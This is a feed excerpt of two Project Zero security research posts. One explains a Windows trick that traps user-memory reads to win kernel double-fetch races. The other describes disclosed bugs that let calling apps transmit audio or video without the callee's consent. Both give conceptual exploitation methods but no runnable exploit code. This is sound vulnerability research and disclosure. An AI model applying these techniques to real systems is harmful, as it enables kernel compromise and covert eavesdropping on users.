class="c5"&gt;&lt;span class="c17"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;On the face of it this doesn&amp;rsquo;t look massively different to previous examples, however in this case the destination pointer is being changed rather than the size. The &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-probeforwrite"&gt;ProbeForWrite&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;kernel API which checks the pointer is both at a user-mode address and the memory is writable. This is a commonly used idiom to verify a user supplied pointer is not pointing into kernel memory. &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;If the pointer value is changed between &amp;#9312; and &amp;#9313; from a user mode address to a kernel mode address the example would overwrite kernel memory. The behavior is harder to exploit with a probabilistic exploit as there are only two valid values of the pointer, either a user-mode address or a kernel mode address. If you&amp;rsquo;re brute forcing the pointer value then it&amp;rsquo;s possible to end up where both fetches read a user-mode pointer even though it might change to a kernel pointer in between the fetches.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;Fortunately, due to the call to &lt;/span&gt;&lt;span class="c1"&gt;ProbeForWrite &lt;/span&gt;&lt;span class="c0"&gt;this is trivial to exploit if you can trap on user memory access as shown in the following diagram:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c11 c1"&gt;&lt;a href="https://1.bp.blogspot.com/-ODNsY-JRbDY/YAhvVXjUGfI/AAAAAAAAaqs/ZZNOS4mlZpUhZVWXL4igruFFMVRFdbYPQCNcBGAsYHQ/s875/image4%2B%25281%2529.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-ODNsY-JRbDY/YAhvVXjUGfI/AAAAAAAAaqs/ZZNOS4mlZpUhZVWXL4igruFFMVRFdbYPQCNcBGAsYHQ/s600/image4%2B%25281%2529.png" border="0" alt="Diagram showing access to the UserPointer which is then passed to ProbeForWrite. We can generate a page fault when probing the buffer which can allow us to modify the original pointer." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c11 c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;From the diagram the first read from &lt;/span&gt;&lt;span class="c1"&gt;UserPointer&lt;/span&gt;&lt;span&gt;&amp;nbsp;is made &amp;#9312; and the resulting pointer value passed to &lt;/span&gt;&lt;span class="c1"&gt;ProbeForWrite&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="c1"&gt;ProbeForWrite &lt;/span&gt;&lt;span&gt;API first checks if the pointer is in the user-mode address space, then probes each page of memory up to the size of the length parameter &amp;#9313;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;If the page is invalid or is not writable then an exception will be generated and caught by the example&amp;#39;s &lt;/span&gt;&lt;span class="c1"&gt;__except&lt;/span&gt;&lt;span&gt;&amp;nbsp;block. This gives us our exploit opportunity, we can use the exploitation trick on the one of the user-mode pages which is being probed which will cause &lt;/span&gt;&lt;span class="c1"&gt;ProbeForWrite &lt;/span&gt;&lt;span class="c0"&gt;to generate a page fault we can trap &amp;#9314;. However as the address being probed is not the same as the one storing the pointer we can modify it to contain a kernel mode address while the request is trapped &amp;#9315;. The result is we can deterministically win the race.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;Of course I&amp;rsquo;ve been focussing on kernel double fetches as it&amp;rsquo;s what originally drew me to look for this behavior. There are many scenarios where this can be used to aid exploitation of user-mode applications. The most obvious one is where a service is sharing memory with a lower privileged application. An example of this sort of issue was a &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1648"&gt;double-fetch in the DfMarshal COM marshaler&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. The COM marshaler shared a memory section between processes so it was possible to provide a section which exploited our trick. In the end this trick wasn&amp;rsquo;t necessary as the logic of the vulnerable code allowed me to create an infinite loop to extend the double fetch window. However if that didn&amp;#39;t exist we could use this trick to detect and delay when the code was at the point where the handle could be switched.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;Another more subtle use is where a privileged process reads memory from a less privileged process. This might be explicit use of APIs such as &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory"&gt;ReadProcessMemory&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;or it could be indirect, for example querying for the process&amp;rsquo; command line using &lt;/span&gt;&lt;span class="c1"&gt;NtQueryInformationProcess &lt;/span&gt;&lt;span class="c0"&gt;will read out memory locations under our control.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;The thing to remember with this exploitation trick is it can be used to open up the window to win a timing race. In this case it&amp;rsquo;s similar to my previous work on oplocks, but instead for memory access. In fact the access to memory might be incidental to the vulnerable code, it doesn&amp;rsquo;t have to be a memory double fetch or necessarily even a TOCTOU vulnerability. &lt;/span&gt;&lt;span&gt;For example you might be trying to win a race between two file paths with symbolic links. As long as the vulnerable code can be made to probe a user mode address we control then you can use it as a timing signal and to widen the exploitation window.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c44" id="h.ahyvz49oskx5"&gt;&lt;span class="c31"&gt;Conclusions&lt;/span&gt;&lt;/h2&gt;&lt;p class="c5"&gt;&lt;span&gt;I&amp;rsquo;ve described an exploitation trick by combining SMB and the Cloud File API which can &lt;/span&gt;&lt;span&gt;aid in demonstrati&lt;/span&gt;&lt;span&gt;ng exploitation of certain types of the application and kernel vulnerabilities. It&amp;rsquo;s possible that there are other ways of achieving a similar result with APIs I haven&amp;rsquo;t looked at, but for now this is the best approach I&amp;rsquo;ve come up with. It allows you to trap on reads from user-mode memory, detect when the access occurs and delay the read for at least 60 seconds. Examples of code to implement the SMB and Cloud File API tricks are available &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2142"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;It&amp;rsquo;s worth just reiterating some more of the limitations of this exploitation trick before we conclude.&lt;/span&gt;&lt;/p&gt;&lt;ul style='padding: 0;' class="c19 lst-kix_2duiues326zm-0 start"&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;Can&amp;rsquo;t be used in a sandbox, only from a normal user privilege.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;Only allows a one shot for any page mapped from the file. If something else (such as AV) tries to read that page or from the file then the trap may fire early.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span&gt;Can&amp;rsquo;t detect the exact location of a read, &lt;/span&gt;&lt;span&gt;limited to a granularity of 4KiB&lt;/span&gt;&lt;span class="c0"&gt;. For local access via the Cloud File API this will always populate the next 7 pages as well as part of the 32KiB read. If accessing a custom SMB server the read size can be reduced to 4KiB. Would prevent exploitation of certain bugs which require precise trapping only on a small area within a larger structure.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;Can only detect writes indirectly, can&amp;rsquo;t specifically trap on a write.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;From a practical perspective the trick presented here doesn&amp;rsquo;t significantly improve the win rates for traditional kernel double fetches outlined in the Bochspwn paper. Realistically for most of those classes of vulnerability you&amp;rsquo;d probably want to use a probabilistic approach, if anything due to its simplicity of implementation. However the trick is applicable to other bug classes where the memory trap is used as a deterministic timing signal adjunct to the vulnerability.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;The one shot nature of the trick also makes it of no real benefit to exploiting simple double fetch code paths. Also more complex code which might read and write to a memory address more than once before you get to the vulnerable code which might make managing traps more difficult.&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/7843265571440320887/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/7843265571440320887" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/7843265571440320887" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html" title="Windows Exploitation Tricks: Trapping Virtual Memory Access" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-CTshtFzpZZg/YAhvVabh38I/AAAAAAAAaqw/t-S2XtYBdZYTrUdcHdXaF2Iv3EiRlHXoACNcBGAsYHQ/s72-c/image6.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-6291003668138377503</id>
    <published>2021-01-19T09:28:00.004-08:00</published>
    <updated>2021-02-04T13:12:08.963-08:00</updated>
    <title type="text">The State of State Machines</title>
    <content type="html">&lt;style type="text/css"&gt;ol{margin:0;padding:0}table td,table th{padding:0}.c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.c8{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c7{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c5{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c4{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c12{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c6{color:inherit;text-decoration:inherit}.c3{font-weight:400;font-family:"Courier New"}.c10{border:1px solid black;margin:5px}.c11{font-size:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c12"&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;Posted by Natalie Silvanovich, Project Zero&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;On January 29, 2019, a serious &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://support.apple.com/en-us/HT209520"&gt;vulnerability&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;was discovered in Group FaceTime which allowed an attacker to call a target and force the call to connect without user interaction from the target, allowing the attacker to listen to the target&amp;rsquo;s surroundings without their knowledge or consent. The bug was remarkable in both its impact and mechanism. The ability to force a target device to transmit audio to an attacker device without gaining code execution was an unusual and possibly unprecedented impact of a vulnerability. Moreover, the vulnerability was a logic bug in the FaceTime calling state machine that could be exercised using only the user interface of the device. While this bug was soon fixed, the fact that such a serious and easy to reach vulnerability had occurred due to a logic bug in a calling state machine -- an attack scenario I had never seen considered on any platform -- made me wonder whether other state machines had similar vulnerabilities as well. This post describes my investigation into calling state machines of a number of messaging platforms, including Signal, JioChat, Mocha, Google Duo, and Facebook Messenger.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c8" id="h.3tmt47nphsxu"&gt;&lt;span class="c9"&gt;WebRTC and State Machines&lt;/span&gt;&lt;/h1&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;The majority of video conferencing applications are implemented using &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://webrtc.org/"&gt;WebRTC&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which I&amp;rsquo;ve discussed in several past &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://googleprojectzero.blogspot.com/2018/12/adventures-in-video-conferencing-part-1.html"&gt;blog&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-1.html"&gt;posts&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. &amp;nbsp;WebRTC connections are created by exchanging call set-up information in Session Description Protocol (SDP) between peers, a process which is called signalling. Signalling is not implemented by WebRTC, which allows peers to exchange SDP in whatever secure communication message is available to them, usually WebSockets for web applications, and secure messaging for messaging applications.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;There are a few types of SDP that can be exchanged by WebRTC peers. In a typical connection, the caller starts off by sending an SDP offer, and then the callee responds with an SDP answer. These messages contain most information that is needed to transmit and receive media, including codec support, encryption keys and much more. After the offer/answer exchange, peers can send SDP candidates to other peers. Candidates are potential network paths that the two peers can use to connect to each other, and SDP candidates contain information such as IP addresses and TURN servers. Peers usually send more than one candidate to a peer, and candidates can be sent at any time during a connection.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;WebRTC connections maintain an internal state related to whether an offer or answer has been received and processed, however, applications that use WebRTC usually have to maintain their own state machine to manage the user state of the application. How the user state maps to the WebRTC state is a design choice made by the WebRTC integrator, which has both security and performance consequences. For example, some applications do not exchange any SDP until the callee user has interacted with the application to answer the call, meanwhile others set up the peer-to-peer connection, and start sending audio and video from caller to callee before the callee is even notified of the call.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;Regardless of design, transmitting audio or video from an input device must be directly enabled by application code using WebRTC. This is usually done using a feature called tracks. Every input device is considered a &amp;lsquo;track&amp;rsquo;, and each specific track must be added to a specific peer connection by calling &lt;/span&gt;&lt;span class="c3"&gt;addTrack&lt;/span&gt;&lt;span&gt;&amp;nbsp;(or language equivalent) before audio or video is transmitted. Tracks can also be disabled, which is useful for implementing mute and camera-off features. Each track also has an &lt;/span&gt;&lt;span class="c3"&gt;RTPSender&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;property that can be used to fine-tune the properties of transmission, which can also be used to disable audio or video transmission.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;Theoretically, ensuring callee consent before audio or video transmission should be a fairly simple matter of waiting until the user accepts the call before adding any tracks to the peer connection. However, when I looked at real applications they enabled transmission in many different ways. Most of these led to vulnerabilities that allowed calls to be connected without interaction from the callee.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c8" id="h.6wmphw3nmrvb"&gt;&lt;span class="c9"&gt;Signal Messenger&lt;/span&gt;&lt;/h1&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;I looked at &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://signal.org/en/"&gt;Signal &lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;in September 2019, and at that time, the application had a calling setup that is very similar to what is recommended in WebRTC documentation.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/-3WEtXcOMSJ8/YADm6aUFTfI/AAAAAAAAao8/VnztmKLwoFsJOFS413fG9j83nxIxW_cfwCNcBGAsYHQ/s936/image2.jpg" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-3WEtXcOMSJ8/YADm6aUFTfI/AAAAAAAAao8/VnztmKLwoFsJOFS413fG9j83nxIxW_cfwCNcBGAsYHQ/s600/image2.jpg" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;A peer-to-peer connection is established, and then the callee&amp;#39;s audio track is added to the connection when the callee accepts the call by interacting with the user interface. Then a message is sent to the caller via the peer-to-peer connection, telling it to also move to the connected state and add the track.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;Unfortunately, the application didn&amp;rsquo;t check that the device receiving the connect message was the caller device, so it was possible to send a connect message from the caller device to the callee. This caused the audio call to connect, allowing the caller to hear the callee&amp;rsquo;s surroundings. I tested this bug by changing Signal&amp;rsquo;s open-source code to send the message and recompiling the attacking client.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;This &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1943"&gt;vulnerability&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;was fixed in the client in September 2019, and since then, Signal&amp;rsquo;s signalling code has been replaced by the ringrtc project, which uses a more conservative state machine.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;This bug was purely in Signal&amp;rsquo;s code, and was not due to a misunderstanding of WebRTC functionality. The state machine design was largely effective requiring user consent to transmit audio, but a specific check was not implemented.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c8" id="h.3u2e2up84373"&gt;&lt;span class="c9"&gt;JioChat and Mocha&lt;/span&gt;&lt;/h1&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;I accidentally found two very similar vulnerabilities in &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://www.jio.com/en-in/apps/jio-chat"&gt;JioChat&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://play.google.com/store/apps/details?id=com.viettel.mocha.app&amp;hl=en_US&amp;gl=US"&gt;Mocha&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;messengers in July 2020 while &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-3.html"&gt;testing&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;whether a WebRTC exploit would work on them. They both had a similar signalling design, which was server-mediated.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/-wTErzbXpJxI/YADm8Ba_pAI/AAAAAAAAapY/Mez8B5fI3KwZ67E3Ew6L0bSGDyFLls1gQCNcBGAsYHQ/s960/image8.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-wTErzbXpJxI/YADm8Ba_pAI/AAAAAAAAapY/Mez8B5fI3KwZ67E3Ew6L0bSGDyFLls1gQCNcBGAsYHQ/s600/image8.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt; &lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;The offer and answer are exchanged via the server, and then both the caller and the callee send their candidates to the server. The server then stores them until the callee interacts with their device and accepts the call. Then the peer-to-peer connection is created, and when WebRTC enters into its internal connected state, the track is added, causing audio and video to be transmitted.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;This design has a fundamental problem, as candidates can be optionally included in an SDP offer or answer. In that case, the peer-to-peer connection will start immediately, as the only thing preventing the connection in this design is the lack of candidates, which will in turn lead to transmission from input devices. I tested this by using Frida to add candidates to the offers created by each of these applications. I was able to cause JioChat to &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2059&amp;q=jiochat&amp;can=1"&gt;send audio&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;without user consent, and Mocha to &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2064&amp;q=mocha&amp;can=1"&gt;send audio and video&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. Both of these vulnerabilities were fixed soon after they were filed by filtering SDP on the server.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;These issues were caused by a misunderstanding of how WebRTC works coupled with an attempt to improve WebRTC performance with an unusual signalling design. Normally, WebRTC integrators have to decide whether to wait until the callee has answered the call to set up the peer-to-peer connection. Setting the connection up early improves performance and prevents the user from having to wait when they answer a call, but also greatly increases the remote attack surface of WebRTC. These applications tried to improve performance without the security cost with this design, but didn&amp;rsquo;t consider all the ways that WebRTC can start a peer-to-peer connection.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;It is generally not a good idea for integrators to gate audio or video transmission on any WebRTC feature that is not adding or enabling tracks. To start, many WebRTC features are complex, so it is easy to make a mistake that allows audio or video to be transmitted. Also, if the feature that is gated on is not commonly-used or not a security feature, it could be poorly tested or changed in the future.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c8" id="h.8htob0rs10i7"&gt;&lt;span class="c9"&gt;Duo&lt;/span&gt;&lt;/h1&gt;&lt;p class="c2"&gt;&lt;span&gt;I looked at &lt;/span&gt;&lt;span class="c4"&gt;&lt;a class="c61" href="https://duo.google.com/about/"&gt;Google Duo&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;in September 2020. Duo&amp;rsquo;s signalling methodology is somewhat different from a lot of messengers because it supports a feature that allows the callee to preview the caller&amp;rsquo;s video before answering. So a one-way video stream needs to be set up before the call is answered.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/-ab-Iay2fJ_g/YADm6wH5KXI/AAAAAAAAapM/esKuCRr4iQozbekfVOxje4ufK_-ZDv3OwCNcBGAsYHQ/s929/image5.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-ab-Iay2fJ_g/YADm6wH5KXI/AAAAAAAAapM/esKuCRr4iQozbekfVOxje4ufK_-ZDv3OwCNcBGAsYHQ/s600/image5.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;The image above shows the setup of the one-way video stream. Dotted lines represent asynchronous calls made using Java executors. The lack of transmission from callee to caller is enforced by two methods. First, the SDP offer contains the property &lt;/span&gt;&lt;span class="c3"&gt;a=sendonly&lt;/span&gt;&lt;span&gt;&amp;nbsp;for video, which causes video to only be transmitted in one direction. Also, when the callee receives the offer from the caller,&lt;/span&gt;&lt;span&gt;&amp;nbsp;it adds the video track&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the peer connection, but then disables it using the &lt;/span&gt;&lt;span class="c3"&gt;RTPSender&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;property of the track (the audio track is not added or enabled until the user accepts the call).&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c2"&gt;&lt;span&gt;Neither of these methods effectively prevents video from being transmitted from callee to caller. The SDP property is easy to get around because the caller provides the SDP to the callee, so it can be easily altered. Disabling the video track as soon as the offer is processed should work, except for the asynchronous design. Normally, the &lt;/span&gt;&lt;span class="c3"&gt;setLocalDescription&lt;/span&gt;&lt;span&gt;&amp;nbsp;method (which processes the SDP offer) calls the callback &lt;/span&gt;&lt;span class="c3"&gt;onSetSuccess&lt;/span&gt;&lt;span&gt;, and then sets up the peer-to-peer connection after the callback has finished. However, if the callback makes another asynchronous call, the guarantee that &lt;/span&gt;&lt;span class="c3"&gt;onSetSuccess&lt;/span&gt;&lt;span&gt;&amp;nbsp;finishes before the connection is set up no longer holds, because the &lt;/span&gt;&lt;span class="c3"&gt;setLocalDescription&lt;/span&gt;&lt;span&gt;&amp;nbsp;method only waits for the &lt;/span&gt;&lt;span class="c3"&gt;onSetSuccess&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;thread to finish. This creates a race between disabling the video and setting up the connection, so in some situations, the callee could transmit a few video frames to the caller before transmission is disabled.&lt;/span&gt;&lt;/p&gt;&lt;p class="c1"&gt;&lt;span 